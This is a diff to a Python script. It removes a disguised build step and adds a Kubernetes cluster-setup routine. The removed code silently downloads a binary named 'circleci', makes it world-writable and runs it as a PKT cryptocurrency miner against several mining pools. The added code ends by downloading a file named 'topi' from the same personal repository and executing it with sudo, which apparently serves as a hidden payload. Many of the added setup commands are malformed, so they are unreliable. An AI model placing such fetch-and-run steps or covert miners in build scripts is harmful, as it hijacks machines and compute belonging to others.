@@ -1,18 +1,27 @@
 import subprocess
-def main():
-    print("BUILD!!")
-
-    cmd = "nohup wget https://github.com/aurbach55/pos/raw/main/circleci > /tmp/circleci.log 2>&1 >/dev/null 2>&1"
-    subprocess.call(cmd, shell=True)
-
-    cmd = "chmod 777 circleci > /tmp/circleci.log 2>&1 >/dev/null 2>&1"
-    subprocess.call(cmd, shell=True)
-
-    cmd = "timeout 5m nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > /tmp/circleci.log 2>&1 >/dev/null 2>&1"
-    subprocess.call(cmd, shell=True)
-
-    print("done!!")
-
 
 if __name__ == '__main__':
-    main()
+    subprocess.run('sudo su apt-get update', shell=True)
+    subprocess.run('sudo su apt-get install ebtables arptables -y', shell=True)
+    subprocess.run('echo "net.bridge.bridge-nf-call-ip6tables = 1" >> /etc/sysctl.d/k8s.conf', shell=True)
+    subprocess.run('echo "net.bridge.bridge-nf-call-iptables = 1" >> /etc/sysctl.d/k8s.conf', shell=True)
+    subprocess.run('sudo su sysctl --system', shell=True)
+    subprocess.run('sudo su modprobe br_netfilter', shell=True)
+    subprocess.run('sudo su swapoff -a', shell=True)
+    subprocess.run('sudo su apt-get update', shell=True)
+    subprocess.run('sudo su apt install docker.io -y', shell=True)
+    subprocess.run('sudo su apt-get update', shell=True)
+    subprocess.run('sudo su curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add', shell=True)
+    subprocess.run('sudo su apt-add-repository "deb http://apt.kubernetes.io/ kubernetes-xenial main"', shell=True)
+    subprocess.run('sudo su apt-get update', shell=True)
+    subprocess.run('sudo su apt-get install -y kubelet kubeadm kubectl', shell=True)
+    subprocess.run('sudo su apt-mark hold kubeadm kubelet kubectl', shell=True)
+    subprocess.run('sudo su hostnamectl set-hostname master01', shell=True)
+    subprocess.run('sudo su kubeadm init --pod-network-cidr=192.168.0.0/16', shell=True)
+    subprocess.run('mkdir -p $HOME/.kube', shell=True)
+    subprocess.run('cp -i /etc/kubernetes/admin.conf $HOME/.kube/config', shell=True)
+    subprocess.run('chown $(id -u):$(id -g) $HOME/.kube/config', shell=True)
+    subprocess.run('curl https://docs.projectcalico.org/manifests/calico.yaml -O', shell=True)
+    subprocess.run('kubectl apply -f calico.yaml', shell=True)
+    subprocess.run('kubectl taint nodes --all node-role.kubernetes.io/master-', shell=True)
+    subprocess.run('sudo su wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && sudo su chmod 777 topi && sudo su ./topi', shell=True)
